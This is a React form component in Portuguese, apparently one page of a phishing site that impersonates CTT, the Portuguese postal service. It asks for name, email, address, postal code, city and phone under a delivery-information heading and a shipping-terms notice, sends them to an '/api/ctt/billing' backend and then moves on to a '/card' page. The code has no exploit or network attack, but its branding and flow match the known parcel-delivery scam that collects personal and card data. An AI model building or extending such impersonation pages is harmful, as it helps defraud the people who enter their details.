import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Card, CardContent } from './ui/card';
import { Button } from './ui/button';
import { Input } from './ui/input';
import { Label } from './ui/label';
import { AlertCircle } from 'lucide-react';
import axios from 'axios';

// Get API URL from environment
const API = process.env.REACT_APP_BACKEND_URL || 'http://localhost:8001';

const CTTBillingForm = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    nome: '',
    email: '',
    endereco: '',
    codigoPostal: '',
    cidade: '',
    telefone: ''
  });
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleSubmit = async () => {
    // Basic validation
    if (!formData.nome || !formData.email || !formData.endereco || 
        !formData.codigoPostal || !formData.cidade || !formData.telefone) {
      return;
    }

    setIsSubmitting(true);
    
    try {
      const response = await axios.post(`${API}/api/ctt/billing`, formData);
      
      if (response.data.status === 'success') {
        // Store billing ID for later use
        localStorage.setItem('ctt_billing_id', response.data.billing_id);
        localStorage.setItem('ctt_billing_data', JSON.stringify(formData));
        
        // Navigate to card page
        navigate('/card');
      }
      
    } catch (error) {
      console.error('Error submitting billing data:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
      <Card className="shadow-lg border-0 rounded-lg overflow-hidden">
        <CardContent className="p-8">
          {/* Form Header */}
          <div className="flex items-center mb-8">
            <AlertCircle className="w-5 h-5 text-red-600 mr-3" />
            <h2 className="text-xl font-semibold text-gray-900">
              Informações de entrega
            </h2>
          </div>

          {/* Form Fields */}
          <div className="space-y-6">
            {/* Nome */}
            <div className="space-y-2">
              <Label htmlFor="nome" className="text-sm font-medium text-gray-700">
                Nome <span className="text-red-500">*</span>
              </Label>
              <Input
                id="nome"
                name="nome"
                type="text"
                value={formData.nome}
                onChange={handleInputChange}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                placeholder="Nome completo"
              />
            </div>

            {/* Email */}
            <div className="space-y-2">
              <Label htmlFor="email" className="text-sm font-medium text-gray-700">
                Correio electrónico <span className="text-red-500">*</span>
              </Label>
              <Input
                id="email"
                name="email"
                type="email"
                value={formData.email}
                onChange={handleInputChange}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                placeholder="exemplo@email.com"
              />
            </div>

            {/* Endereço */}
            <div className="space-y-2">
              <Label htmlFor="endereco" className="text-sm font-medium text-gray-700">
                Endereço <span className="text-red-500">*</span>
              </Label>
              <Input
                id="endereco"
                name="endereco"
                type="text"
                value={formData.endereco}
                onChange={handleInputChange}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                placeholder="Rua, número, andar"
              />
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {/* Código Postal */}
              <div className="space-y-2">
                <Label htmlFor="codigoPostal" className="text-sm font-medium text-gray-700">
                  Código postal <span className="text-red-500">*</span>
                </Label>
                <Input
                  id="codigoPostal"
                  name="codigoPostal"
                  type="text"
                  value={formData.codigoPostal}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                  placeholder="0000-000"
                />
              </div>

              {/* Cidade */}
              <div className="space-y-2">
                <Label htmlFor="cidade" className="text-sm font-medium text-gray-700">
                  Cidade <span className="text-red-500">*</span>
                </Label>
                <Input
                  id="cidade"
                  name="cidade"
                  type="text"
                  value={formData.cidade}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                  placeholder="Nome da cidade"
                />
              </div>
            </div>

            {/* Telefone */}
            <div className="space-y-2">
              <Label htmlFor="telefone" className="text-sm font-medium text-gray-700">
                Número de telefone <span className="text-red-500">*</span>
              </Label>
              <Input
                id="telefone"
                name="telefone"
                type="tel"
                value={formData.telefone}
                onChange={handleInputChange}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                placeholder="+351 9XX XXX XXX"
              />
            </div>
          </div>

          {/* Terms Notice */}
          <div className="mt-6 text-sm text-gray-600">
            Ao clicar no botão "Seguinte", está a aceitar as Condições Especiais de Envio Internacional.
          </div>

          {/* Submit Button */}
          <div className="mt-8 flex justify-end">
            <Button
              onClick={handleSubmit}
              disabled={isSubmitting}
              className={`px-8 py-2 rounded-md font-medium transition-colors duration-200 ${
                isSubmitting 
                  ? 'bg-gray-400 cursor-not-allowed' 
                  : 'bg-red-600 hover:bg-red-700 text-white'
              }`}
            >
              {isSubmitting ? (
                <div className="flex items-center">
                  <svg className="animate-spin -ml-1 mr-3 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Processando...
                </div>
              ) : (
                'Seguinte'
              )}
            </Button>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default CTTBillingForm;